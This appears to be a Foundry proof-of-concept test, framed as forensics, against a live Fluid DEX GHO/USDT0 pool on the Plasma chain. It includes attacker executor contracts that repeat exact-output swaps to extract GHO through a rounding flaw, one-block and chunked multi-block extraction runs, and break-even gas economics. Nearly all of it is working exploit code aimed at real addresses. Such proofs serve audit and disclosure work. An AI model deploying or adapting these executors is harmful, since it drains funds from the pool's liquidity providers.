// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.21;

import {Test} from "forge-std/Test.sol";

interface IERC20Forensic {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IFluidDexForensic {
    function swapOut(bool swap0to1, uint256 amountOut, uint256 amountInMax, address to)
        external payable returns (uint256 amountIn);
}

contract PlasmaForensicAtomicExecutor {
    IFluidDexForensic internal immutable pool;

    constructor(address pool_, address gho_, address usdt_) {
        pool = IFluidDexForensic(pool_);
        require(IERC20Forensic(gho_).approve(pool_, type(uint256).max), "GHO_APPROVE");
        require(IERC20Forensic(usdt_).approve(pool_, type(uint256).max), "USDT_APPROVE");
    }

    function atomicCycle(uint256 rounds, uint256 ghoOutEach)
        external
        returns (uint256 totalUsdtInput, uint256 reverseGhoInput)
    {
        for (uint256 i; i < rounds; ++i) {
            totalUsdtInput += pool.swapOut(
                false, ghoOutEach, type(uint256).max, address(this)
            );
        }
        reverseGhoInput = pool.swapOut(
            true, totalUsdtInput, type(uint256).max, address(this)
        );
    }
}

contract PlasmaForensicChunkedExecutor {
    IFluidDexForensic internal immutable pool;
    uint256 internal immutable ghoOutEach;

    uint256 public pendingUsdtOutput;
    uint256 public completedForwardRounds;

    constructor(address pool_, address gho_, address usdt_, uint256 ghoOutEach_) {
        pool = IFluidDexForensic(pool_);
        ghoOutEach = ghoOutEach_;
        require(IERC20Forensic(gho_).approve(pool_, type(uint256).max), "GHO_APPROVE");
        require(IERC20Forensic(usdt_).approve(pool_, type(uint256).max), "USDT_APPROVE");
    }

    function forwardChunk(uint256 rounds) external returns (uint256 chunkUsdtInput) {
        for (uint256 i; i < rounds; ++i) {
            chunkUsdtInput += pool.swapOut(
                false, ghoOutEach, type(uint256).max, address(this)
            );
        }
        pendingUsdtOutput += chunkUsdtInput;
        completedForwardRounds += rounds;
    }

    function reverseAndReset() external returns (uint256 reverseGhoInput, uint256 restoredUsdt) {
        restoredUsdt = pendingUsdtOutput;
        require(restoredUsdt > 0, "NO_PENDING_USDT");
        reverseGhoInput = pool.swapOut(
            true, restoredUsdt, type(uint256).max, address(this)
        );
        pendingUsdtOutput = 0;
    }
}

contract PlasmaGhoUsdtForensicProofTest is Test {
    address internal constant POOL = 0x080574D224E960c272e005aA03EFbe793f317640;
    address internal constant LIQUIDITY = 0x52Aa899454998Be5b000Ad077a46Bbe360F4e497;
    address internal constant GHO = 0xb77E872A68C62CfC0dFb02C067Ecc3DA23B4bbf3;
    address internal constant USDT0 = 0xB8CE59FC3717ada4C02eaDF9682A9e934F625ebb;

    // Live Plasma USDT0 holder. The proof transfers ordinary existing tokens;
    // it does not mutate token storage or mint test balances.
    address internal constant USDT0_LIVE_HOLDER = 0x8741B106e9738a6971AD07DABCFe95FF66337b51;

    uint256 internal constant FUNDING_USDT0 = 1_000_000; // 1 USDT0
    uint256 internal constant ATOMIC_ROUNDS = 128;
    uint256 internal constant ATOMIC_GHO_OUT = 256_100_000_000_001;
    uint256 internal constant CHUNK_GHO_OUT = 256_000_000_000_001;
    uint256 internal constant CHUNK_ROUNDS = 256;
    uint256 internal constant CHUNKS_PER_SEQUENCE = 8;
    uint256 internal constant REPEATED_SEQUENCES = 4;
    uint256 internal constant CALL_GAS_CAP = 35_000_000;
    uint256 internal constant CONSERVATIVE_TX_OVERHEAD = 50_000;

    uint256 internal forkBlock;
    uint256 internal observedGasPriceWei;

    event ForensicDeployment(
        uint256 forkBlock,
        uint256 chainId,
        uint256 blockGasLimit,
        bytes32 poolCodehash,
        bytes32 liquidityCodehash,
        bytes32 ghoCodehash,
        bytes32 usdtCodehash,
        uint256 liveHolderUsdtBalance
    );

    event ForensicAtomicProof(
        uint256 rounds,
        uint256 ghoOutEach,
        uint256 totalForwardUsdtInput,
        uint256 reverseGhoInput,
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityUsdtGain,
        uint256 liquidityGhoLoss,
        uint256 stableValueGain18,
        uint256 measuredGas,
        uint256 conservativeGas,
        uint256 gasPriceWei,
        uint256 nativeCostWei,
        uint256 breakEvenXplUsd18
    );

    event ForensicSequence(
        uint256 indexed sequence,
        uint256 forwardRounds,
        uint256 simulatedTransactions,
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityUsdtGain,
        uint256 liquidityGhoLoss,
        uint256 measuredGas,
        uint256 maxTransactionGas
    );

    event ForensicRepeatedProof(
        uint256 sequences,
        uint256 totalForwardRounds,
        uint256 simulatedTransactions,
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityUsdtGain,
        uint256 liquidityGhoLoss,
        uint256 stableValueGain18,
        uint256 measuredGas,
        uint256 conservativeGas,
        uint256 maxTransactionGas,
        uint256 gasPriceWei,
        uint256 nativeCostWei,
        uint256 breakEvenXplUsd18
    );

    event ForensicRoundingSensitivity(
        uint256 affectedExactOutputCalls,
        uint256 demonstratedStableValueGain18,
        uint256 oneExtraRawUsdtPerCallCost18,
        int256 counterfactualStableValue18
    );

    function setUp() public {
        forkBlock = vm.envUint("PLASMA_FORK_BLOCK");
        observedGasPriceWei = vm.envUint("PLASMA_GAS_PRICE_WEI");
        vm.createSelectFork(vm.envString("PLASMA_RPC_URL"), forkBlock);

        assertEq(block.chainid, 9745, "unexpected chain");
        assertGt(POOL.code.length, 0, "pool not deployed");
        assertGt(LIQUIDITY.code.length, 0, "liquidity not deployed");
        assertGt(GHO.code.length, 0, "GHO not deployed");
        assertGt(USDT0.code.length, 0, "USDT0 not deployed");

        emit ForensicDeployment(
            forkBlock,
            block.chainid,
            block.gaslimit,
            POOL.codehash,
            LIQUIDITY.codehash,
            GHO.codehash,
            USDT0.codehash,
            IERC20Forensic(USDT0).balanceOf(USDT0_LIVE_HOLDER)
        );
    }

    function _fundWithExistingUsdt(address recipient) internal {
        uint256 supplyBefore = IERC20Forensic(USDT0).totalSupply();
        uint256 holderBefore = IERC20Forensic(USDT0).balanceOf(USDT0_LIVE_HOLDER);
        uint256 recipientBefore = IERC20Forensic(USDT0).balanceOf(recipient);

        assertGe(holderBefore, FUNDING_USDT0, "live holder balance too small");
        vm.prank(USDT0_LIVE_HOLDER);
        require(IERC20Forensic(USDT0).transfer(recipient, FUNDING_USDT0), "LIVE_TRANSFER");

        assertEq(IERC20Forensic(USDT0).totalSupply(), supplyBefore, "USDT supply changed");
        assertEq(
            IERC20Forensic(USDT0).balanceOf(USDT0_LIVE_HOLDER),
            holderBefore - FUNDING_USDT0,
            "holder debit mismatch"
        );
        assertEq(
            IERC20Forensic(USDT0).balanceOf(recipient),
            recipientBefore + FUNDING_USDT0,
            "recipient credit mismatch"
        );
    }

    function _stableValueGain18(uint256 ghoGain, uint256 usdtLoss)
        internal pure returns (uint256)
    {
        uint256 usdtLoss18 = usdtLoss * 1e12;
        require(ghoGain > usdtLoss18, "non-positive parity value");
        return ghoGain - usdtLoss18;
    }

    function _economics(uint256 stableValueGain18, uint256 measuredGas, uint256 txCount)
        internal view returns (
            uint256 conservativeGas,
            uint256 nativeCostWei,
            uint256 breakEvenXplUsd18
        )
    {
        conservativeGas = measuredGas + txCount * CONSERVATIVE_TX_OVERHEAD;
        nativeCostWei = conservativeGas * observedGasPriceWei;
        require(nativeCostWei > 0, "zero native cost");
        breakEvenXplUsd18 = (stableValueGain18 * 1e18) / nativeCostWei;
    }

    function _assertConservation(
        address attacker,
        uint256 attackerUsdtBefore,
        uint256 attackerGhoBefore,
        uint256 liquidityUsdtBefore,
        uint256 liquidityGhoBefore
    ) internal view returns (
        uint256 attackerUsdtLoss,
        uint256 attackerGhoGain,
        uint256 liquidityUsdtGain,
        uint256 liquidityGhoLoss
    ) {
        uint256 attackerUsdtAfter = IERC20Forensic(USDT0).balanceOf(attacker);
        uint256 attackerGhoAfter = IERC20Forensic(GHO).balanceOf(attacker);
        uint256 liquidityUsdtAfter = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
        uint256 liquidityGhoAfter = IERC20Forensic(GHO).balanceOf(LIQUIDITY);

        assertLe(attackerUsdtAfter, attackerUsdtBefore, "attacker USDT unexpectedly increased");
        assertGe(attackerGhoAfter, attackerGhoBefore, "attacker GHO decreased");
        assertGe(liquidityUsdtAfter, liquidityUsdtBefore, "Liquidity USDT decreased");
        assertLe(liquidityGhoAfter, liquidityGhoBefore, "Liquidity GHO increased");

        attackerUsdtLoss = attackerUsdtBefore - attackerUsdtAfter;
        attackerGhoGain = attackerGhoAfter - attackerGhoBefore;
        liquidityUsdtGain = liquidityUsdtAfter - liquidityUsdtBefore;
        liquidityGhoLoss = liquidityGhoBefore - liquidityGhoAfter;

        assertEq(attackerUsdtLoss, liquidityUsdtGain, "USDT victim accounting mismatch");
        assertEq(attackerGhoGain, liquidityGhoLoss, "GHO victim accounting mismatch");
    }

    function test_atomicDeployedPool_closedCycle_noSyntheticBalances() public {
        PlasmaForensicAtomicExecutor executor = new PlasmaForensicAtomicExecutor(POOL, GHO, USDT0);
        assertEq(IERC20Forensic(GHO).balanceOf(address(executor)), 0, "executor starts with GHO");
        _fundWithExistingUsdt(address(executor));

        uint256 ghoSupplyBefore = IERC20Forensic(GHO).totalSupply();
        uint256 usdtSupplyBefore = IERC20Forensic(USDT0).totalSupply();
        uint256 attackerUsdtBefore = IERC20Forensic(USDT0).balanceOf(address(executor));
        uint256 attackerGhoBefore = IERC20Forensic(GHO).balanceOf(address(executor));
        uint256 liquidityUsdtBefore = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
        uint256 liquidityGhoBefore = IERC20Forensic(GHO).balanceOf(LIQUIDITY);

        uint256 gasBefore = gasleft();
        (uint256 totalForwardUsdtInput, uint256 reverseGhoInput) = executor.atomicCycle(
            ATOMIC_ROUNDS, ATOMIC_GHO_OUT
        );
        uint256 measuredGas = gasBefore - gasleft();

        (
            uint256 attackerUsdtLoss,
            uint256 attackerGhoGain,
            uint256 liquidityUsdtGain,
            uint256 liquidityGhoLoss
        ) = _assertConservation(
            address(executor),
            attackerUsdtBefore,
            attackerGhoBefore,
            liquidityUsdtBefore,
            liquidityGhoBefore
        );

        assertEq(IERC20Forensic(GHO).totalSupply(), ghoSupplyBefore, "GHO supply changed");
        assertEq(IERC20Forensic(USDT0).totalSupply(), usdtSupplyBefore, "USDT supply changed");
        assertGt(attackerGhoGain, 0, "no extracted GHO");
        assertLe(attackerUsdtLoss, 2, "unexpected USDT loss");
        assertLt(measuredGas + CONSERVATIVE_TX_OVERHEAD, block.gaslimit, "not one-block executable");

        uint256 stableValueGain18 = _stableValueGain18(attackerGhoGain, attackerUsdtLoss);
        (
            uint256 conservativeGas,
            uint256 nativeCostWei,
            uint256 breakEvenXplUsd18
        ) = _economics(stableValueGain18, measuredGas, 1);

        emit ForensicAtomicProof(
            ATOMIC_ROUNDS,
            ATOMIC_GHO_OUT,
            totalForwardUsdtInput,
            reverseGhoInput,
            attackerUsdtLoss,
            attackerGhoGain,
            liquidityUsdtGain,
            liquidityGhoLoss,
            stableValueGain18,
            measuredGas,
            conservativeGas,
            observedGasPriceWei,
            nativeCostWei,
            breakEvenXplUsd18
        );
    }

    function _advanceBlock() internal {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);
    }

    function _boundedCall(address target, bytes memory data)
        internal returns (uint256 gasUsed)
    {
        uint256 gasBefore = gasleft();
        (bool ok, bytes memory returnData) = target.call{gas: CALL_GAS_CAP}(data);
        gasUsed = gasBefore - gasleft();
        if (!ok) {
            assembly {
                revert(add(returnData, 32), mload(returnData))
            }
        }
    }

    function test_repeatedMultiBlockExtraction_noSyntheticBalances() public {
        PlasmaForensicChunkedExecutor executor = new PlasmaForensicChunkedExecutor(
            POOL, GHO, USDT0, CHUNK_GHO_OUT
        );
        assertEq(IERC20Forensic(GHO).balanceOf(address(executor)), 0, "executor starts with GHO");
        _fundWithExistingUsdt(address(executor));

        uint256 ghoSupplyBefore = IERC20Forensic(GHO).totalSupply();
        uint256 usdtSupplyBefore = IERC20Forensic(USDT0).totalSupply();
        uint256 initialAttackerUsdt = IERC20Forensic(USDT0).balanceOf(address(executor));
        uint256 initialAttackerGho = IERC20Forensic(GHO).balanceOf(address(executor));
        uint256 initialLiquidityUsdt = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
        uint256 initialLiquidityGho = IERC20Forensic(GHO).balanceOf(LIQUIDITY);

        uint256 measuredGas;
        uint256 maxTransactionGas;
        uint256 simulatedTransactions;

        for (uint256 sequence; sequence < REPEATED_SEQUENCES; ++sequence) {
            uint256 sequenceAttackerUsdt = IERC20Forensic(USDT0).balanceOf(address(executor));
            uint256 sequenceAttackerGho = IERC20Forensic(GHO).balanceOf(address(executor));
            uint256 sequenceLiquidityUsdt = IERC20Forensic(USDT0).balanceOf(LIQUIDITY);
            uint256 sequenceLiquidityGho = IERC20Forensic(GHO).balanceOf(LIQUIDITY);
            uint256 sequenceGas;
            uint256 sequenceMaxGas;

            for (uint256 chunk; chunk < CHUNKS_PER_SEQUENCE; ++chunk) {
                uint256 gasUsed = _boundedCall(
                    address(executor),
                    abi.encodeCall(PlasmaForensicChunkedExecutor.forwardChunk, (CHUNK_ROUNDS))
                );
                sequenceGas += gasUsed;
                measuredGas += gasUsed;
                ++simulatedTransactions;
                if (gasUsed > sequenceMaxGas) sequenceMaxGas = gasUsed;
                if (gasUsed > maxTransactionGas) maxTransactionGas = gasUsed;
                _advanceBlock();
            }

            uint256 reverseGas = _boundedCall(
                address(executor),
                abi.encodeCall(PlasmaForensicChunkedExecutor.reverseAndReset, ())
            );
            sequenceGas += reverseGas;
            measuredGas += reverseGas;
            ++simulatedTransactions;
            if (reverseGas > sequenceMaxGas) sequenceMaxGas = reverseGas;
            if (reverseGas > maxTransactionGas) maxTransactionGas = reverseGas;
            _advanceBlock();

            (
                uint256 sequenceUsdtLoss,
                uint256 sequenceGhoGain,
                uint256 sequenceLiquidityUsdtGain,
                uint256 sequenceLiquidityGhoLoss
            ) = _assertConservation(
                address(executor),
                sequenceAttackerUsdt,
                sequenceAttackerGho,
                sequenceLiquidityUsdt,
                sequenceLiquidityGho
            );

            assertGt(sequenceGhoGain, sequenceUsdtLoss * 1e12, "sequence not parity-positive");
            emit ForensicSequence(
                sequence + 1,
                CHUNK_ROUNDS * CHUNKS_PER_SEQUENCE,
                CHUNKS_PER_SEQUENCE + 1,
                sequenceUsdtLoss,
                sequenceGhoGain,
                sequenceLiquidityUsdtGain,
                sequenceLiquidityGhoLoss,
                sequenceGas,
                sequenceMaxGas
            );
        }

        (
            uint256 attackerUsdtLoss,
            uint256 attackerGhoGain,
            uint256 liquidityUsdtGain,
            uint256 liquidityGhoLoss
        ) = _assertConservation(
            address(executor),
            initialAttackerUsdt,
            initialAttackerGho,
            initialLiquidityUsdt,
            initialLiquidityGho
        );

        uint256 totalForwardRounds =
            REPEATED_SEQUENCES * CHUNKS_PER_SEQUENCE * CHUNK_ROUNDS;
        uint256 stableValueGain18 = _stableValueGain18(attackerGhoGain, attackerUsdtLoss);
        (
            uint256 conservativeGas,
            uint256 nativeCostWei,
            uint256 breakEvenXplUsd18
        ) = _economics(stableValueGain18, measuredGas, simulatedTransactions);

        assertEq(IERC20Forensic(GHO).totalSupply(), ghoSupplyBefore, "GHO supply changed");
        assertEq(IERC20Forensic(USDT0).totalSupply(), usdtSupplyBefore, "USDT supply changed");
        assertEq(executor.pendingUsdtOutput(), 0, "reverse leg not closed");
        assertEq(executor.completedForwardRounds(), totalForwardRounds, "round count mismatch");
        assertLt(maxTransactionGas, block.gaslimit, "a simulated transaction exceeds block limit");

        emit ForensicRepeatedProof(
            REPEATED_SEQUENCES,
            totalForwardRounds,
            simulatedTransactions,
            attackerUsdtLoss,
            attackerGhoGain,
            liquidityUsdtGain,
            liquidityGhoLoss,
            stableValueGain18,
            measuredGas,
            conservativeGas,
            maxTransactionGas,
            observedGasPriceWei,
            nativeCostWei,
            breakEvenXplUsd18
        );

        uint256 oneExtraRawUsdtPerCallCost18 = totalForwardRounds * 1e12;
        int256 counterfactualStableValue18 =
            int256(stableValueGain18) - int256(oneExtraRawUsdtPerCallCost18);
        assertLt(counterfactualStableValue18, 0, "one-unit upward correction insufficient");
        emit ForensicRoundingSensitivity(
            totalForwardRounds,
            stableValueGain18,
            oneExtraRawUsdtPerCallCost18,
            counterfactualStableValue18
        );
    }
}
